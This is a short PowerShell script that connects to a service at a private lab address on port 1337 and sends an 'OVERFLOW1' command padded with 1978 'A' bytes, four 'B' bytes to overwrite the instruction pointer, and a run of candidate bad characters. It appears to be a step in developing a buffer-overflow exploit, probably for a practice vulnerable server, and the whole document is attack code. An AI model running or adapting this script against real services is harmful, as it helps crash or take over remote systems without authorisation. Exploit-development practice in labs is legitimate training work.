$server = '10.10.173.119'
$port = 1337
$function = [byte[]][char[]]'OVERFLOW1 '
[byte[]]$confirmedBad = @(0x00, 0x07, 0x2e, 0xa0)
[byte[]]$badChars = 0..255 | Where-Object { $_ -notin $confirmedBad }
[byte[]][char[]]$eip = 'A' * 1978 + 'B' * 4
$pwnz = $function + $eip + $badChars
$socket = [System.Net.Sockets.TcpClient]::new()

try {
    $socket.Client.Connect($server, $port)
}
catch {
    $socket.Close()
    $socket.Dispose()
}

try {
    $socket.Client.Send($pwnz)
    $socket.Close()
    $socket.Dispose()
}
catch {
    $socket.Close()
    $socket.Dispose()
    throw $_.Exception
}